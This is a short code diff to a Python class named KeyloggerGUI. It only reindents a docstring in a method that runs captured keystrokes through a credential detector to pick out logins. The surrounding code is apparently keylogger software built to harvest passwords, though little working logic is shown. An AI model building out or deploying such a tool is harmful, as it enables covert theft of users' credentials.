@@ -302,7 +302,7 @@ class KeyloggerGUI:
         return str(key).replace("Key.", ""), False, False
 
     def update_suspected_logins(self):
-    """Send internal logs into the detector module and update credentials display."""
+        """Send internal logs into the detector module and update credentials display."""
         
         results = self.credential_detector.find_logins(self.captured_text)
         if results:
